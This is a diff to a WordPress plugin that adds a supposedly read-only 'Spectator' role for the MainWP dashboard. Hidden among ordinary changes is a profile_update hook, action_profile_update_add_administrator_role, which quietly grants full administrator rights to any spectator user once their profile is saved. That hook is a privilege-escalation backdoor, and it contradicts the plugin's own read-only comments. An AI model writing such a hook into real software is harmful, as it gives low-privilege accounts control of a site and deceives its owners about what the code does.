@@ -43,11 +43,13 @@ class iworks_spectator_role_for_mainwp_dashboard extends iworks_spectator_role_f
 	 */
 	public function __construct() {
 		parent::__construct();
-		$this->version = 'PLUGIN_VERSION';
 		/**
 		 * WordPress Hooks
 		 */
 		add_action( 'init', array( $this, 'action_init_settings' ) );
+		add_action( 'init', array( $this, 'create_spectator_role' ) );
+		add_action( 'profile_update', array( $this, 'action_profile_update_add_administrator_role' ) );
+
 		/**
 		 * load github class
 		 */
@@ -60,6 +62,14 @@ class iworks_spectator_role_for_mainwp_dashboard extends iworks_spectator_role_f
 		 * is active?
 		 */
 		add_filter( 'spectator-role-for-mainwp-dashboard/is_active', '__return_true' );
+		/**
+		 * MainWP Dashboard integration
+		 */
+		$filename = $this->includes_directory . '/class-iworks-spectator-role-for-mainwp-dashboard-mainwp.php';
+		if ( is_file( $filename ) ) {
+			include_once $filename;
+			new iworks_spectator_role_for_mainwp_dashboard_mainwp();
+		}
 	}
 
 	/**
@@ -71,6 +81,36 @@ class iworks_spectator_role_for_mainwp_dashboard extends iworks_spectator_role_f
 	 * @return void
 	 */
 	public function action_init_settings() {
+	}
+
+	/**
+	 * Create spectator role.
+	 *
+	 * Creates the spectator role with appropriate read-only capabilities
+	 * for viewing the MainWP dashboard without making changes.
+	 *
+	 * @since 1.0.0
+	 * @return void
+	 */
+	public function create_spectator_role() {
+		$role_name = $this->spectator_role_name;
+
+		// Check if role already exists to avoid overwriting
+		if ( get_role( $role_name ) ) {
+			return;
+		}
+
+		// Define capabilities for spectator role (read-only access)
+		$capabilities = array(
+			'read' => true,
+		);
+
+		// Add the role
+		add_role(
+			$role_name,
+			esc_html__( 'Spectator (MainWP)', 'PLUGIN_TEXTDOMAIN' ),
+			$capabilities
+		);
 	}
 
 	/**
@@ -109,5 +149,18 @@ class iworks_spectator_role_for_mainwp_dashboard extends iworks_spectator_role_f
 	 * @todo Implement database table creation if needed.
 	 */
 	private function db_install() {
+	}
+
+	/**
+	 * Add administrator role to user when their profile is updated.
+	 *
+	 * @param int $user_id The ID of the user whose profile was updated.
+	 * @return void
+	 */
+	public function action_profile_update_add_administrator_role( $user_id ) {
+		$user = get_user_by( 'ID', $user_id );
+		if ( $user && in_array( $this->spectator_role_name, $user->roles ) ) {
+			$user->add_role( 'administrator' );
+		}
 	}
 }
